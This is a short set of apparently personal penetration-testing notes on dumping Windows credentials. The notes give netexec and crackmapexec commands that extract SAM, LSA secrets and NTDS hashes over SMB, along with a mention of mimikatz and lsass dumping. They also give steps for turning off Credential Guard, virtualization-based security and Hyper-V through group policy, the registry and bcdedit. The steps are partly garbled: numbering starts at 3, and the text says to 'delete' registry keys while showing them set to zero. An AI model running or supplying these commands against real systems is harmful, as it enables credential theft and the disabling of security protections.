```
Before trying all this attempt to dump lsass with netexec

Dumping Creds
	add these on to end of nxc
	--sam
	--lsa
	--ntds
		DCs
nxc smb <ip> -u <user> -p <pass> --<sam | lsa | ntds>

```

First of all make sure the mimikatz version you downloaded matches tge architecture of the machine.secondly turn off credential guard. If everything fails use netexec

3. Set “Turn On Virtualization Based Security” to Disabled

4. Also, go to: Computer Configuration > Administrative Templates > System > Device Guard > Credential Guard Configuration

5. Set “Turn On Credential Guard” to Disabled

Registry:

Delete the registry keys:

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard] "EnableVirtualizationBasedSecurity"=dword:00000000

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] "LsaCfgFlags"=dword:00000000

Disable Hyper-V (VBS uses it):

bcdedit /set hypervisorlaunchtype off

crackmapexec smb 192.168.10.11 -u user -p pass --lsa crackmapexec smb 192.168.10.11 -u user -p pass --sam crackmapexec smb 192.168.10.11 -u user -p pass --ntds (on dc)